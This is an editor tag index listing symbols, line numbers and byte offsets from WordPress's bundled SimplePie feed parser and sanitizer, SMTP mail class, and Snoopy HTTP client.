	var $element = array('');element14616,377801
	var $element = array('');element14616,377801
	var $xml_base = array('');xml_base14617,377828
	var $xml_base = array('');xml_base14617,377828
	var $xml_base_explicit = array(false);xml_base_explicit14618,377856
	var $xml_base_explicit = array(false);xml_base_explicit14618,377856
	var $xml_lang = array('');xml_lang14619,377896
	var $xml_lang = array('');xml_lang14619,377896
	var $data = array();data14620,377924
	var $data = array();data14620,377924
	var $datas = array(array());datas14621,377946
	var $datas = array(array());datas14621,377946
	var $current_xhtml_construct = -1;current_xhtml_construct14622,377976
	var $current_xhtml_construct = -1;current_xhtml_construct14622,377976
	var $encoding;encoding14623,378012
	function parse(&$data, $encoding)parse14625,378029
			$this->encoding = 'UTF-8';encoding14630,378206
			$this->encoding = $encoding;encoding14634,378251
			$data = substr($data, 4);data14641,378385
			$data = substr($data, 4);data14646,378506
			$data = substr($data, 2);data14651,378616
			$data = substr($data, 2);data14656,378729
			$data = substr($data, 3);data14661,378831
			$declaration =& new SimplePie_XML_Declaration_Parser(substr($data, 5, $pos - 5));declaration14666,379001
				$data = substr($data, $pos + 2);data14669,379121
				$data = '<?xml version="' . $declaration->version . '" encoding="' . $encoding . '" standalone="' . (($declaration->standalone) ? 'yes' : 'no') . '"?>' . $data;data14670,379158
				$this->error_string = 'SimplePie bug! Please report this!';error_string14674,379341
		$return = true;return14679,379433
		static $xml_is_sane = null;xml_is_sane14681,379452
		static $xml_is_sane = null;xml_is_sane14681,379452
			$parser_check = xml_parser_create();parser_check14684,379515
			$xml_is_sane = isset($values[0]['value']);xml_is_sane14687,379660
			$xml = xml_parser_create_ns($this->encoding, $this->separator);xml14693,379758
				$this->error_code = xml_get_error_code($xml);error_code14703,380141
				$this->error_string = xml_error_string($this->error_code);error_string14704,380191
				$return = false;return14705,380254
			$this->current_line = xml_get_current_line_number($xml);current_line14707,380280
			$this->current_column = xml_get_current_column_number($xml);current_column14708,380340
			$this->current_byte = xml_get_current_byte_index($xml);current_byte14709,380404
			$xml =& new XMLReader();xml14716,380549
							$tagName = $xml->namespaceURI . $this->separator . $xml->localName;tagName14726,380754
							$tagName = $xml->localName;tagName14730,380856
						$empty = $xml->isEmptyElement;empty14735,380994
							$tagName = $xml->namespaceURI . $this->separator . $xml->localName;tagName14738,381076
							$tagName = $xml->localName;tagName14742,381178
						$attributes = array();attributes14744,381221
								$attrName = $xml->namespaceURI . $this->separator . $xml->localName;attrName14749,381347
								$attrName = $xml->localName;attrName14753,381454
				$this->error_code = $error->code;error_code14772,381882
				$this->error_string = $error->message;error_string14773,381920
				$this->current_line = $error->line;current_line14774,381963
				$this->current_column = $error->column;current_column14775,382003
	function get_error_code()get_error_code14785,382113
	function get_error_string()get_error_string14790,382175
	function get_current_line()get_current_line14795,382241
	function get_current_column()get_current_column14800,382307
	function get_current_byte()get_current_byte14805,382377
	function get_data()get_data14810,382443
	function tag_open($parser, $tag, $attributes)tag_open14815,382493
		$attribs = array();attribs14819,382614
		foreach ($attributes as $name => $value)name14820,382636
					foreach ($attribs[''] as $name => $value)name14854,383581
			$this->data =& $this->data['child'][end($this->namespace)][end($this->element)][];data14865,383845
			$this->data = array('data' => '', 'attribs' => $attribs, 'xml_base' => end($this->xml_base), 'xml_base_explicit' => end($this->xml_base_explicit), 'xml_lang' => end($this->xml_lang));data14866,383931
				$this->current_xhtml_construct = 0;current_xhtml_construct14870,384585
	function cdata($parser, $cdata)cdata14875,384638
	function tag_close($parser, $tag)tag_close14887,384859
			$this->data =& $this->datas[count($this->datas) - 1];data14899,385314
	function split_ns($string)split_ns14910,385567
		static $cache = array();cache14912,385598
		static $cache = array();cache14912,385598
				static $separator_length;separator_length14917,385714
					$separator_length = strlen($this->separator);separator_length14920,385778
				$namespace = substr($string, 0, $pos);namespace14922,385835
				$local_name = substr($string, $pos + $separator_length);local_name14923,385878
					$namespace = SIMPLEPIE_NAMESPACE_ITUNES;namespace14926,386008
					$namespace = SIMPLEPIE_NAMESPACE_MEDIARSS;namespace14932,386168
class SimplePie_SanitizeSimplePie_Sanitize14948,386593
	var $base;base14951,386637
	var $remove_div = true;remove_div14954,386662
	var $remove_div = true;remove_div14954,386662
	var $image_handler = '';image_handler14955,386687
	var $image_handler = '';image_handler14955,386687
	var $strip_htmltags = array('base', 'blink', 'body', 'doctype', 'embed', 'font', 'form', 'frame', 'frameset', 'html', 'iframe', 'input', 'marquee', 'meta', 'noscript', 'object', 'param', 'script', 'style');strip_htmltags14956,386713
	var $strip_htmltags = array('base', 'blink', 'body', 'doctype', 'embed', 'font', 'form', 'frame', 'frameset', 'html', 'iframe', 'input', 'marquee', 'meta', 'noscript', 'object', 'param', 'script', 'style');strip_htmltags14956,386713
	var $encode_instead_of_strip = false;encode_instead_of_strip14957,386921
	var $encode_instead_of_strip = false;encode_instead_of_strip14957,386921
	var $strip_attributes = array('bgsound', 'class', 'expr', 'id', 'style', 'onclick', 'onerror', 'onfinish', 'onmouseover', 'onmouseout', 'onfocus', 'onblur', 'lowsrc', 'dynsrc');strip_attributes14958,386960
	var $strip_attributes = array('bgsound', 'class', 'expr', 'id', 'style', 'onclick', 'onerror', 'onfinish', 'onmouseover', 'onmouseout', 'onfocus', 'onblur', 'lowsrc', 'dynsrc');strip_attributes14958,386960
	var $strip_comments = false;strip_comments14959,387139
	var $strip_comments = false;strip_comments14959,387139
	var $output_encoding = 'UTF-8';output_encoding14960,387169
	var $output_encoding = 'UTF-8';output_encoding14960,387169
	var $enable_cache = true;enable_cache14961,387202
	var $enable_cache = true;enable_cache14961,387202
	var $cache_location = './cache';cache_location14962,387229
	var $cache_location = './cache';cache_location14962,387229
	var $cache_name_function = 'md5';cache_name_function14963,387263
	var $cache_name_function = 'md5';cache_name_function14963,387263
	var $cache_class = 'SimplePie_Cache';cache_class14964,387298
	var $cache_class = 'SimplePie_Cache';cache_class14964,387298
	var $file_class = 'SimplePie_File';file_class14965,387337
	var $file_class = 'SimplePie_File';file_class14965,387337
	var $timeout = 10;timeout14966,387374
	var $timeout = 10;timeout14966,387374
	var $useragent = '';useragent14967,387394
	var $useragent = '';useragent14967,387394
	var $force_fsockopen = false;force_fsockopen14968,387416
	var $force_fsockopen = false;force_fsockopen14968,387416
	var $replace_url_attributes = array(replace_url_attributes14970,387448
	var $replace_url_attributes = array(replace_url_attributes14970,387448
	function remove_div($enable = true)remove_div14982,387687
		$this->remove_div = (bool) $enable;remove_div14984,387727
	function set_image_handler($page = false)set_image_handler14987,387769
			$this->image_handler = (string) $page;image_handler14991,387832
			$this->image_handler = false;image_handler14995,387889
	function pass_cache_data($enable_cache = true, $cache_location = './cache', $cache_name_function = 'md5', $cache_class = 'SimplePie_Cache')pass_cache_data14999,387930
	function pass_cache_data($enable_cache = true, $cache_location = './cache', $cache_name_function = 'md5', $cache_class = 'SimplePie_Cache')cache_location14999,387930
			$this->enable_cache = (bool) $enable_cache;enable_cache15003,388106
			$this->cache_location = (string) $cache_location;cache_location15008,388185
			$this->cache_name_function = (string) $cache_name_function;cache_name_function15013,388275
			$this->cache_class = (string) $cache_class;cache_class15018,388367
	function pass_file_data($file_class = 'SimplePie_File', $timeout = 10, $useragent = '', $force_fsockopen = false)pass_file_data15022,388422
	function pass_file_data($file_class = 'SimplePie_File', $timeout = 10, $useragent = '', $force_fsockopen = false)timeout15022,388422
			$this->file_class = (string) $file_class;file_class15026,388563
			$this->timeout = (string) $timeout;timeout15031,388633
			$this->useragent = (string) $useragent;useragent15036,388699
			$this->force_fsockopen = (string) $force_fsockopen;force_fsockopen15041,388775
	function strip_htmltags($tags = array('base', 'blink', 'body', 'doctype', 'embed', 'font', 'form', 'frame', 'frameset', 'html', 'iframe', 'input', 'marquee', 'meta', 'noscript', 'object', 'param', 'script', 'style'))strip_htmltags15045,388838
				$this->strip_htmltags = $tags;strip_htmltags15051,389105
				$this->strip_htmltags = explode(',', $tags);strip_htmltags15055,389158
			$this->strip_htmltags = false;strip_htmltags15060,389227
	function encode_instead_of_strip($encode = false)encode_instead_of_strip15064,389269
		$this->encode_instead_of_strip = (bool) $encode;encode_instead_of_strip15066,389323
	function strip_attributes($attribs = array('bgsound', 'class', 'expr', 'id', 'style', 'onclick', 'onerror', 'onfinish', 'onmouseover', 'onmouseout', 'onfocus', 'onblur', 'lowsrc', 'dynsrc'))strip_attributes15069,389378
				$this->strip_attributes = $attribs;strip_attributes15075,389625
				$this->strip_attributes = explode(',', $attribs);strip_attributes15079,389683
			$this->strip_attributes = false;strip_attributes15084,389757
	function strip_comments($strip = false)strip_comments15088,389801
		$this->strip_comments = (bool) $strip;strip_comments15090,389845
	function set_output_encoding($encoding = 'UTF-8')set_output_encoding15093,389890
		$this->output_encoding = (string) $encoding;output_encoding15095,389944
	function set_url_replacements($element_attribute = array('a' => 'href', 'area' => 'href', 'blockquote' => 'cite', 'del' => 'cite', 'form' => 'action', 'img' => array('longdesc', 'src'), 'input' => 'src', 'ins' => 'cite', 'q' => 'cite'))set_url_replacements15106,390240
		$this->replace_url_attributes = (array) $element_attribute;replace_url_attributes15108,390481
	function sanitize($data, $type, $base = '')sanitize15111,390547
	function sanitize($data, $type, $base = '')base15111,390547
		$data = trim($data);data15113,390595
				$data = base64_decode($data);data15130,391056
					$data = preg_replace('/^<div' . SIMPLEPIE_PCRE_XML_ATTRIBUTE . '>/', '', $data);data15137,391176
					$data = preg_replace('/<\/div>$/', '', $data);data15138,391262
					$data = preg_replace('/^<div' . SIMPLEPIE_PCRE_XML_ATTRIBUTE . '>/', '<div>', $data);data15142,391335
					$data = SimplePie_Misc::strip_comments($data);data15151,391573
						$pcre = "/<($tag)" . SIMPLEPIE_PCRE_HTML_ATTRIBUTE . "(>(.*)<\/$tag" . SIMPLEPIE_PCRE_HTML_ATTRIBUTE . '>|(\/)?>)/siU';pcre15161,391936
							$data = preg_replace_callback($pcre, array(&$this, 'do_strip_htmltags'), $data);data15164,392109
						$data = preg_replace('/(<[A-Za-z][^\x09\x0A\x0B\x0C\x0D\x20\x2F\x3E]*)' . SIMPLEPIE_PCRE_HTML_ATTRIBUTE . trim($attrib) . '(?:\s*=\s*(?:"(?:[^"]*)"|\'(?:[^\']*)\'|(?:[^\x09\x0A\x0B\x0C\x0D\x20\x22\x27\x3E][^\x09\x0A\x0B\x0C\x0D\x20\x3E]*)?))?' . SIMPLEPIE_PCRE_HTML_ATTRIBUTE . '>/', '\1\2\3>', $data);data15173,392315
				$this->base = $base;base15178,392667
				foreach ($this->replace_url_attributes as $element => $attributes)element15179,392692
					$data = $this->replace_urls($data, $element, $attributes);data15181,392769
					$images = SimplePie_Misc::get_element('img', $data);images15187,393039
							$image_url = call_user_func($this->cache_name_function, $img['attribs']['src']['data']);image_url15192,393192
							$cache = call_user_func(array($this->cache_class, 'create'), $this->cache_location, $image_url, 'spi');cache15193,393288
								$data = str_replace($img['full'], SimplePie_Misc::element_implode($img), $data);data15198,393512
								$file =& new $this->file_class($img['attribs']['src']['data'], $this->timeout, 5, array('X-FORWARDED-FOR' => $_SERVER['REMOTE_ADDR']), $this->useragent, $this->force_fsockopen);file15202,393631
								$headers = $file->headers;headers15203,393817
										$data = str_replace($img['full'], SimplePie_Misc::element_implode($img), $data);data15210,394210
				$data = trim($data);data15223,394678
				$data = SimplePie_Misc::absolutize_url($data, $base);data15228,394754
				$data = htmlspecialchars($data, ENT_COMPAT, 'UTF-8');data15233,394892
				$data = SimplePie_Misc::change_encoding($data, 'UTF-8', $this->output_encoding);data15238,395004
	function replace_urls($data, $tag, $attributes)replace_urls15244,395118
			$elements = SimplePie_Misc::get_element($tag, $data);elements15248,395256
							$new_element = SimplePie_Misc::element_implode($element);new_element15258,395639
							$data = str_replace($element['full'], $new_element, $data);data15259,395704
					$data = str_replace($element['full'], SimplePie_Misc::element_implode($element), $data);data15267,396034
	function do_strip_htmltags($match)do_strip_htmltags15274,396163

wordpress/wp-includes/class-smtp.php,6696
class SMTP {SMTP46,2311
  public $SMTP_PORT = 25;SMTP_PORT51,2374
  public $SMTP_PORT = 25;SMTP_PORT51,2374
  public $CRLF = "\r\n";CRLF57,2460
  public $CRLF = "\r\n";CRLF57,2460
  public $do_debug;       // the level of debug to performdo_debug63,2556
  public $do_verp = false;do_verp69,2688
  public $do_verp = false;do_verp69,2688
  public $Version         = '5.2.1';Version75,2789
  public $Version         = '5.2.1';Version75,2789
  private $smtp_conn; // the socket to the serversmtp_conn81,2971
  private $error;     // error if any on the last callerror82,3021
  private $helo_rply; // the reply the server sent to us for HELOhelo_rply83,3076
   * Initialize the class so that the data is in a known state.so86,3149
  public function __construct() {__construct90,3257
    $this->smtp_conn = 0;smtp_conn91,3291
    $this->error = null;error92,3317
    $this->helo_rply = null;helo_rply93,3342
    $this->do_debug = 0;do_debug95,3372
  public function Connect($host, $port = 0, $tval = 30) {Connect115,3973
  public function Connect($host, $port = 0, $tval = 30) {port115,3973
    $this->error = null;error117,4089
      $this->error = array("error" => "Already connected to a server");error122,4229
      $port = $this->SMTP_PORT;port127,4351
    $this->smtp_conn = @fsockopen($host,    // the host of the serversmtp_conn131,4424
      $this->error = array("error" => "Failed to connect to server",error138,4826
    $announce = $this->get_lines();announce153,5427
  public function StartTLS() {StartTLS171,5865
    $this->error = null; # to avoid confusionerror172,5896
      $this->error = array("error" => "Called StartTLS() without being connected");error175,5973
    $rply = $this->get_lines();rply181,6139
    $code = substr($rply,0,3);code182,6171
      $this->error =error189,6332
  public function Authenticate($username, $password) {Authenticate213,7030
    $rply = $this->get_lines();rply217,7170
    $code = substr($rply,0,3);code218,7202
      $this->error =error221,7257
    $rply = $this->get_lines();rply234,7681
    $code = substr($rply,0,3);code235,7713
      $this->error =error238,7768
    $rply = $this->get_lines();rply251,8196
    $code = substr($rply,0,3);code252,8228
      $this->error =error255,8283
  public function Connected() {Connected273,8743
      $sock_status = socket_get_status($this->smtp_conn);sock_status275,8810
   * It is not considered good to use this function withoutwithout291,9288
  public function Close() {Close296,9423
    $this->error = null; // so there is no confusionerror297,9451
    $this->helo_rply = null;helo_rply298,9504
      $this->smtp_conn = 0;smtp_conn302,9642
  public function Data($msg_data) {Data329,10452
    $this->error = null; // so no confusion is causederror330,10488
      $this->error = array(error333,10573
    $rply = $this->get_lines();rply340,10746
    $code = substr($rply,0,3);code341,10778
      $this->error =error348,10939
    $msg_data = str_replace("\r\n","\n",$msg_data);msg_data370,11849
    $msg_data = str_replace("\r","\n",$msg_data);msg_data371,11901
    $lines = explode("\n",$msg_data);lines372,11951
    $field = substr($lines[0],0,strpos($lines[0],":"));field383,12384
    $in_headers = false;in_headers384,12440
      $in_headers = true;in_headers386,12513
    $max_line_length = 998; // used below; set here for ease in changemax_line_length389,12546
      $lines_out = null;lines_out392,12660
        $in_headers = false;in_headers394,12724
        $pos = strrpos(substr($line,0,$max_line_length)," ");pos398,12878
          $pos = $max_line_length - 1;pos402,12996
          $line = substr($line,$pos);line404,13082
          $line = substr($line,$pos + 1);line407,13184
          $line = "\t" . $line;line414,13388
            $line_out = "." . $line_out;line_out424,13648
    $rply = $this->get_lines();rply434,13880
    $code = substr($rply,0,3);code435,13912
      $this->error =error442,14073
  public function Hello($host = '') {Hello466,14732
    $this->error = null; // so no confusion is causederror467,14770
      $this->error = array(error470,14855
      $host = "localhost";host478,15115
  private function SendHello($hello, $host) {SendHello496,15423
    $rply = $this->get_lines();rply499,15535
    $code = substr($rply,0,3);code500,15567
      $this->error =error507,15729
    $this->helo_rply = $rply;helo_rply517,16059
  public function Mail($from) {Mail536,16592
    $this->error = null; // so no confusion is causederror537,16624
      $this->error = array(error540,16709
    $useVerp = ($this->do_verp ? "XVERP" : "");useVerp545,16831
    $rply = $this->get_lines();rply548,16962
    $code = substr($rply,0,3);code549,16994
      $this->error =error556,17155
  public function Quit($close_on_error = true) {Quit579,17795
    $this->error = null; // so there is no confusionerror580,17844
      $this->error = array(error583,17928
    $byemsg = $this->get_lines();byemsg592,18177
    $rval = true;rval598,18320
    $e = null;e599,18338
    $code = substr($byemsg,0,3);code601,18354
      $e = array("error" => "SMTP server rejected quit command",e604,18478
      $rval = false;rval607,18634
  public function Recipient($to) {Recipient632,19282
    $this->error = null; // so no confusion is causederror633,19317
      $this->error = array(error636,19402
    $rply = $this->get_lines();rply643,19597
    $code = substr($rply,0,3);code644,19629
      $this->error =error651,19806
  public function Reset() {Reset675,20455
    $this->error = null; // so no confusion is causederror676,20483
      $this->error = array(error679,20568
    $rply = $this->get_lines();rply686,20742
    $code = substr($rply,0,3);code687,20774
      $this->error =error694,20935
  public function SendAndMail($from) {SendAndMail723,21861
    $this->error = null; // so no confusion is causederror724,21900
      $this->error = array(error727,21985
    $rply = $this->get_lines();rply734,22175
    $code = substr($rply,0,3);code735,22207
      $this->error =error742,22368
   * This is an optional command for SMTP that this class does notdoes755,22720
   * complete for this class and __may__ be implimented in the futureand757,22851
  public function Turn() {Turn767,23106
    $this->error = array("error" => "This method, TURN, of the SMTP ".error768,23133
  public function getError() {getError781,23477
  private function get_lines() {get_lines798,23987
    $data = "";data799,24020
      $str = @fgets($this->smtp_conn,515);str801,24073

wordpress/wp-includes/class-snoopy.php,15487
class SnoopySnoopy38,1319
	var $host			=	"www.php.net";		// host name we are connecting tohost44,1393
	var $host			=	"www.php.net";		// host name we are connecting tohost44,1393
	var $port			=	80;					// port we are connecting toport45,1458
	var $port			=	80;					// port we are connecting toport45,1458
	var $proxy_host		=	"";					// proxy host to useproxy_host46,1510
	var $proxy_host		=	"";					// proxy host to useproxy_host46,1510
	var $proxy_port		=	"";					// proxy port to useproxy_port47,1559
	var $proxy_port		=	"";					// proxy port to useproxy_port47,1559
	var $proxy_user		=	"";					// proxy user to useproxy_user48,1608
	var $proxy_user		=	"";					// proxy user to useproxy_user48,1608
	var $proxy_pass		=	"";					// proxy password to useproxy_pass49,1657
	var $proxy_pass		=	"";					// proxy password to useproxy_pass49,1657
	var $agent			=	"Snoopy v1.2.4";	// agent we masquerade asagent51,1711
	var $agent			=	"Snoopy v1.2.4";	// agent we masquerade asagent51,1711
	var	$referer		=	"";					// referer info to passreferer52,1770
	var	$referer		=	"";					// referer info to passreferer52,1770
	var $cookies		=	array();			// array of cookies to passcookies53,1819
	var $cookies		=	array();			// array of cookies to passcookies53,1819
	var	$rawheaders		=	array();			// array of raw headers to sendrawheaders55,1918
	var	$rawheaders		=	array();			// array of raw headers to sendrawheaders55,1918
	var $maxredirs		=	5;					// http redirection depth maximum. 0 = disallowmaxredirs58,2038
	var $maxredirs		=	5;					// http redirection depth maximum. 0 = disallowmaxredirs58,2038
	var $lastredirectaddr	=	"";				// contains address of last redirected addresslastredirectaddr59,2112
	var $lastredirectaddr	=	"";				// contains address of last redirected addresslastredirectaddr59,2112
	var	$offsiteok		=	true;				// allows redirection off-siteoffsiteok60,2191
	var	$offsiteok		=	true;				// allows redirection off-siteoffsiteok60,2191
	var $maxframes		=	0;					// frame content depth maximum. 0 = disallowmaxframes61,2250
	var $maxframes		=	0;					// frame content depth maximum. 0 = disallowmaxframes61,2250
	var $expandlinks	=	true;				// expand links to fully qualified URLs.expandlinks62,2321
	var $expandlinks	=	true;				// expand links to fully qualified URLs.expandlinks62,2321
	var $passcookies	=	true;				// pass set cookies back through redirectspasscookies65,2487
	var $passcookies	=	true;				// pass set cookies back through redirectspasscookies65,2487
	var	$user			=	"";					// user for http authenticationuser69,2653
	var	$user			=	"";					// user for http authenticationuser69,2653
	var	$pass			=	"";					// password for http authenticationpass70,2708
	var	$pass			=	"";					// password for http authenticationpass70,2708
	var $accept			=	"image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*";accept73,2790
	var $accept			=	"image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*";accept73,2790
	var $results		=	"";					// where the content is putresults75,2868
	var $results		=	"";					// where the content is putresults75,2868
	var $error			=	"";					// error messages sent hereerror77,2922
	var $error			=	"";					// error messages sent hereerror77,2922
	var	$response_code	=	"";					// response code returned from serverresponse_code78,2974
	var	$response_code	=	"";					// response code returned from serverresponse_code78,2974
	var	$headers		=	array();			// headers returned from server sent hereheaders79,3042
	var	$headers		=	array();			// headers returned from server sent hereheaders79,3042
	var	$maxlength		=	500000;				// max return data length (body)maxlength80,3112
	var	$maxlength		=	500000;				// max return data length (body)maxlength80,3112
	var $read_timeout	=	0;					// timeout on read operations, in secondsread_timeout81,3175
	var $read_timeout	=	0;					// timeout on read operations, in secondsread_timeout81,3175
	var $timed_out		=	false;				// if a read operation timed outtimed_out84,3339
	var $timed_out		=	false;				// if a read operation timed outtimed_out84,3339
	var	$status			=	0;					// http request statusstatus85,3401
	var	$status			=	0;					// http request statusstatus85,3401
	var $temp_dir		=	"/tmp";				// temporary directory that the webservertemp_dir87,3449
	var $temp_dir		=	"/tmp";				// temporary directory that the webservertemp_dir87,3449
	var	$curl_path		=	"/usr/local/bin/curl";curl_path91,3617
	var	$curl_path		=	"/usr/local/bin/curl";curl_path91,3617
	var	$_maxlinelen	=	4096;				// max line length (headers)_maxlinelen105,4177
	var	$_maxlinelen	=	4096;				// max line length (headers)_maxlinelen105,4177
	var $_httpmethod	=	"GET";				// default http request method_httpmethod107,4236
	var $_httpmethod	=	"GET";				// default http request method_httpmethod107,4236
	var $_httpversion	=	"HTTP/1.0";			// default http request version_httpversion108,4297
	var $_httpversion	=	"HTTP/1.0";			// default http request version_httpversion108,4297
	var $_submit_method	=	"POST";				// default submit method_submit_method109,4364
	var $_submit_method	=	"POST";				// default submit method_submit_method109,4364
	var $_submit_type	=	"application/x-www-form-urlencoded";	// default submit type_submit_type110,4423
	var $_submit_type	=	"application/x-www-form-urlencoded";	// default submit type_submit_type110,4423
	var $_mime_boundary	=   "";					// MIME boundary for multipart/form-data submit type_mime_boundary111,4504
	var $_mime_boundary	=   "";					// MIME boundary for multipart/form-data submit type_mime_boundary111,4504
	var $_redirectaddr	=	false;				// will be set if page fetched is a redirect_redirectaddr112,4590
	var $_redirectaddr	=	false;				// will be set if page fetched is a redirect_redirectaddr112,4590
	var $_redirectdepth	=	0;					// increments on an http redirect_redirectdepth113,4667
	var $_redirectdepth	=	0;					// increments on an http redirect_redirectdepth113,4667
	var $_frameurls		= 	array();			// frame src urls_frameurls114,4731
	var $_frameurls		= 	array();			// frame src urls_frameurls114,4731
	var $_framedepth	=	0;					// increments on frame depth_framedepth115,4781
	var $_framedepth	=	0;					// increments on frame depth_framedepth115,4781
	var $_isproxy		=	false;				// set if using a proxy server_isproxy117,4838
	var $_isproxy		=	false;				// set if using a proxy server_isproxy117,4838
	var $_fp_timeout	=	30;					// timeout for socket connection_fp_timeout118,4897
	var $_fp_timeout	=	30;					// timeout for socket connection_fp_timeout118,4897
	function fetch($URI)fetch129,5356
		$URI_PARTS = parse_url($URI);URI_PARTS133,5452
			$this->user = $URI_PARTS["user"];user135,5518
			$this->pass = $URI_PARTS["pass"];pass137,5589
				$this->host = $URI_PARTS["host"];host146,5814
					$this->port = $URI_PARTS["port"];port148,5887
						$path = $URI_PARTS["path"].($URI_PARTS["query"] ? "?".$URI_PARTS["query"] : "");path158,6116
								$this->lastredirectaddr=$this->_redirectaddr;lastredirectaddr175,6761
						$frameurls = $this->_frameurls;frameurls183,6970
						$this->_frameurls = array();_frameurls184,7008
				$this->host = $URI_PARTS["host"];host210,7522
					$this->port = $URI_PARTS["port"];port212,7595
					$path = $URI_PARTS["path"].($URI_PARTS["query"] ? "?".$URI_PARTS["query"] : "");path220,7779
							$this->lastredirectaddr=$this->_redirectaddr;lastredirectaddr235,8375
					$frameurls = $this->_frameurls;frameurls243,8577
					$this->_frameurls = array();_frameurls244,8614
				$this->error	=	'Invalid protocol "'.$URI_PARTS["scheme"].'"\n';error261,8935
	function submit($URI, $formvars="", $formfiles="")submit279,9525
	function submit($URI, $formvars="", $formfiles="")formvars279,9525
		$postdata = $this->_prepare_post_body($formvars, $formfiles);postdata283,9601
		$URI_PARTS = parse_url($URI);URI_PARTS285,9666
			$this->user = $URI_PARTS["user"];user287,9732
			$this->pass = $URI_PARTS["pass"];pass289,9803
				$this->host = $URI_PARTS["host"];host298,10028
					$this->port = $URI_PARTS["port"];port300,10101
						$path = $URI_PARTS["path"].($URI_PARTS["query"] ? "?".$URI_PARTS["query"] : "");path310,10363
								$this->_redirectaddr = $this->_expandlinks($this->_redirectaddr,$URI_PARTS["scheme"]."://".$URI_PARTS["host"]);_redirectaddr323,10867
								$this->lastredirectaddr=$this->_redirectaddr;lastredirectaddr330,11243
						$frameurls = $this->_frameurls;frameurls341,11652
						$this->_frameurls = array();_frameurls342,11690
				$this->host = $URI_PARTS["host"];host369,12205
					$this->port = $URI_PARTS["port"];port371,12278
					$path = $URI_PARTS["path"].($URI_PARTS["query"] ? "?".$URI_PARTS["query"] : "");path379,12499
							$this->_redirectaddr = $this->_expandlinks($this->_redirectaddr,$URI_PARTS["scheme"]."://".$URI_PARTS["host"]);_redirectaddr390,12958
							$this->lastredirectaddr=$this->_redirectaddr;lastredirectaddr397,13328
					$frameurls = $this->_frameurls;frameurls408,13727
					$this->_frameurls = array();_frameurls409,13764
				$this->error	=	'Invalid protocol "'.$URI_PARTS["scheme"].'"\n';error427,14086
	function fetchlinks($URI)fetchlinks441,14509
				$URI = $this->lastredirectaddr;URI446,14600
				$this->results = $this->_striplinks($this->results);results453,14796
				$this->results = $this->_expandlinks($this->results, $URI);results456,14880
	function fetchform($URI)fetchform470,15305
				$this->results = $this->_stripform($this->results);results482,15525
	function fetchtext($URI)fetchtext498,15959
				$this->results = $this->_striptext($this->results);results508,16176
	function submitlinks($URI, $formvars="", $formfiles="")submitlinks522,16603
	function submitlinks($URI, $formvars="", $formfiles="")formvars522,16603
				$URI = $this->lastredirectaddr;URI527,16746
				$this->results = $this->_striplinks($this->results);results539,17060
					$this->results = $this->_expandlinks($this->results,$URI);results541,17144
	function submittext($URI, $formvars = "", $formfiles = "")submittext556,17573
	function submittext($URI, $formvars = "", $formfiles = "")formvars556,17573
				$URI = $this->lastredirectaddr;URI561,17719
				$this->results = $this->_striptext($this->results);results573,18032
					$this->results = $this->_expandlinks($this->results,$URI);results575,18115
	function set_submit_multipart()set_submit_multipart590,18490
		$this->_submit_type = "multipart/form-data";_submit_type592,18526
	function set_submit_normal()set_submit_normal601,18845
		$this->_submit_type = "application/x-www-form-urlencoded";_submit_type603,18878
	function _striplinks($document)_striplinks621,19422
	function _stripform($document)_stripform655,20340
		$match = implode("\r\n",$elements[0]);match660,20568
	function _striptext($document)_striptext675,20949
		$search = array("'<script[^>]*?>.*?</script>'si",	// strip out javascriptsearch682,21152
		$replace = array(	"",replace706,21972
		$text = preg_replace($search,$replace,$document);text731,22459
	function _expandlinks($links,$URI)_expandlinks744,22889
		$match = preg_replace("|/[^\/\.]+\.[^\/\.]+$|","",$match[0]);match749,22969
		$match = preg_replace("|/$|","",$match);match750,23033
		$match_part = parse_url($match);match_part751,23076
		$match_root =match_root752,23111
		$search = array( 	"|^http://".preg_quote($this->host)."|i",search755,23179
		$replace = array(	"",replace762,23349
		$expandedLinks = preg_replace($search,$replace,$links);expandedLinks769,23449
	function _httprequest($url,$fp,$URI,$http_method,$content_type="",$body="")_httprequest784,23910
		$cookie_headers = '';cookie_headers786,23990
		$URI_PARTS = parse_url($URI);URI_PARTS790,24088
			$url = "/";url792,24138
		$headers = $http_method." ".$url." ".$this->_httpversion."\r\n";headers793,24153
				$this->cookies = (array)$this->cookies;cookies809,24729
				foreach ( $this->cookies as $cookieKey => $cookieVal ) {cookieKey814,24873
				$this->rawheaders = (array)$this->rawheaders;rawheaders823,25142
		$this->timed_out = false;timed_out848,26049
		$this->_redirectaddr = false;_redirectaddr852,26132
				$this->status=-100;status859,26317
					$this->_redirectaddr = $URI_PARTS["scheme"]."://".$this->host.":".$this->port;_redirectaddr875,26818
					$this->_redirectaddr = $matches[2];_redirectaddr883,27091
					$this->status= $status[1];status890,27276
				$this->response_code = $currentHeader;response_code892,27326
		$results = '';results898,27418
    		$_data = fread($fp, $this->maxlength);_data900,27442
			$this->status=-100;status909,27654
			$this->_redirectaddr = $this->_expandlinks($match[1],$URI);_redirectaddr918,27883
			$this->results = $results;results933,28466
	function _httpsrequest($url,$URI,$http_method,$content_type="",$body="")_httpsrequest947,28862
		$headers = array();headers952,29013
		$URI_PARTS = parse_url($URI);URI_PARTS954,29036
			$url = "/";url956,29086
				$this->cookies = (array)$this->cookies;cookies973,29641
				$cookie_str = 'Cookie: ';cookie_str977,29750
				foreach ( $this->cookies as $cookieKey => $cookieVal ) {cookieKey978,29780
				$this->rawheaders = (array)$this->rawheaders;rawheaders987,30033
			$safer_header = strtr( $headers[$curr_header], "\"", " " );safer_header1003,30692
		$headerfile = tempnam($temp_dir, "sno");headerfile1013,30952
			$this->error = "Error: cURL could not retrieve the document, error $return.";error1019,31131
		$results = implode("\r\n",$results);results1024,31235
		$result_headers = file("$headerfile");result_headers1026,31275
		$this->_redirectaddr = false;_redirectaddr1028,31317
					$this->_redirectaddr = $URI_PARTS["scheme"]."://".$this->host.":".$this->port;_redirectaddr1043,31909
					$this->_redirectaddr = $matches[2];_redirectaddr1051,32182
				$this->response_code = $result_headers[$currentHeader];response_code1055,32291
			$this->_redirectaddr = $this->_expandlinks($match[1],$URI);_redirectaddr1064,32595
			$this->results = $results;results1079,33178
	function setcookies()setcookies1091,33469
	function _check_timeout($fp)_check_timeout1107,33937
			$fp_status = socket_get_status($fp);fp_status1110,34003
				$this->timed_out = true;timed_out1112,34077
	function _connect(&$fp)_connect1125,34384
				$this->_isproxy = true;_isproxy1129,34478
				$host = $this->proxy_host;host1131,34507
				$port = $this->proxy_port;port1132,34538
			$host = $this->host;host1136,34585
			$port = $this->port;port1137,34609
		$this->status = 0;status1140,34638
			$this->status = $errno;status1157,34866
